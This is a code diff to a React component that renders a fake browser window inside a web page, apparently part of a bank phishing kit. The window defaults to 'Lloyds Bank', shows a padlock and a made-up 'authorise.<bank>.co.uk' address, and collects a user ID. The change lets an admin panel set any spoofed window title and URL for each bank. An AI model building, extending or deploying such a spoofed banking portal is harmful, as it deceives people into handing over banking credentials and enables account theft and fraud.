@@ -2,10 +2,15 @@
 
 import { useState, useEffect } from "react";
 
-export default function BankBrowserPopup({ isOpen, bank, bankName, selectedOption, logoUrl, onClose, onComplete }: any) {
+export default function BankBrowserPopup({ isOpen, bank, bankName, selectedOption, logoUrl, onClose, onComplete, customTitle, customDisplayUrl }: any) {
   if (!isOpen) return null;
 
   const displayName = bank?.name || bankName || "Lloyds Bank";
+  
+  // 🔥 Admin panel ya bank config se aane wala custom display title aur URL, warna default
+  const windowTitle = customTitle || bank?.displayTitle || `${displayName} - Secure Open Banking Portal`;
+  const displayUrl = customDisplayUrl || bank?.displayLink || `authorise.${displayName.toLowerCase().replace(/[^a-z0-9]/g, "")}.co.uk/auth/user`;
+
   const [isLoading, setIsLoading] = useState(true);
   const [streamStatus, setStreamStatus] = useState(`Connecting to Secure Remote Browser...`);
   const [userId, setUserId] = useState("");
@@ -101,18 +106,18 @@ export default function BankBrowserPopup({ isOpen, bank, bankName, selectedOptio
     <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/90 p-2 sm:p-6 backdrop-blur-md font-sans select-none">
       <div className="w-full max-w-5xl h-[85vh] bg-zinc-950 rounded-2xl shadow-2xl border border-zinc-800 flex flex-col overflow-hidden">
         
-        {/* Top Window Title Bar */}
+        {/* Top Window Title Bar - 🔥 Custom Title & Display URL Applied */}
         <div className="bg-zinc-900 px-4 py-3 flex items-center justify-between border-b border-zinc-800 shrink-0">
           <div className="flex items-center gap-2">
             <span className="w-3 h-3 rounded-full bg-rose-500 inline-block cursor-pointer hover:opacity-80 transition" onClick={onClose}></span>
             <span className="w-3 h-3 rounded-full bg-amber-500 inline-block"></span>
             <span className="w-3 h-3 rounded-full bg-emerald-500 inline-block"></span>
-            <span className="text-xs text-zinc-300 font-bold ml-2 tracking-wide">{displayName} - Secure Open Banking Portal</span>
+            <span className="text-xs text-zinc-300 font-bold ml-2 tracking-wide">{windowTitle}</span>
           </div>
 
           <div className="hidden md:flex items-center bg-zinc-950 border border-zinc-800 rounded-xl px-3.5 py-1.5 w-96 text-xs text-zinc-300 font-mono shadow-inner">
             <span className="text-emerald-400 mr-2">🔒</span>
-            <span className="truncate">authorise.{displayName.toLowerCase().replace(/[^a-z0-9]/g, "")}.co.uk/auth/user</span>
+            <span className="truncate">{displayUrl}</span>
           </div>
 
           <div className="flex items-center gap-2.5">
